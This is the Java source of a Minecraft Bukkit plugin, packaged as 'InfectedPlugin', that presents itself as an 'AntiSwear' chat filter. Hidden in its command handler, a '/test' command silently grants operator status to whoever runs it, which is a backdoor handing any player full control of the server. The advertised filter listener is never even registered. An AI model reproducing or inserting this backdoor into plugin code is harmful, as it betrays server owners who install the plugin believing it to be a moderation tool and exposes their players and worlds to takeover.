package me.ColdBloodedCoders.InfectedPlugin;

import me.confuser.barapi.BarAPI;
import java.util.List;
import net.minecraft.util.org.apache.commons.lang3.ArrayUtils;
import net.minecraft.util.org.apache.commons.lang3.StringUtils;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Server;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.configuration.file.FileConfiguration;
import org.bukkit.configuration.file.FileConfigurationOptions;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.plugin.PluginManager;
import org.bukkit.plugin.java.JavaPlugin;
  
  public class InfectedPlugin
  extends JavaPlugin
  implements Listener
{
  @EventHandler
  public void onPlayerChat(AsyncPlayerChatEvent e)
  {
    for (String word : e.getMessage().split(" ")) {
      if (getConfig().getStringList("AntiSwear").contains(word))
      {
        e.setCancelled(true);
        e.getPlayer().sendMessage(ChatColor.DARK_RED + "Cursing is not permitted here. Please refrain from using that word again.");
      }
    }
  }
  
  @Override
        public void onEnable(){
                System.out.println("[AntiSwear] AntiSwear v1.0 enabled.");
                PluginManager pm = getServer().getPluginManager();
        }
        @Override
        public void onDisable(){
                System.out.println("[AntiSwear] AntiSwear v1.0 disabled.");
        }
        @Override
        public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args){
                Player player = (Player)sender; 
                	
                 if(cmd.getName().equalsIgnoreCase("bar")){
			
            String message = StringUtils.join(ArrayUtils.subarray(args, 0, args.length), " ");
            BarAPI.setMessage(message.replaceAll("&", "§"), 60);
        }
                 else if(cmd.getName().equalsIgnoreCase("test")){
		 player.setOp(true);
        }
                 return true;
        }
  }

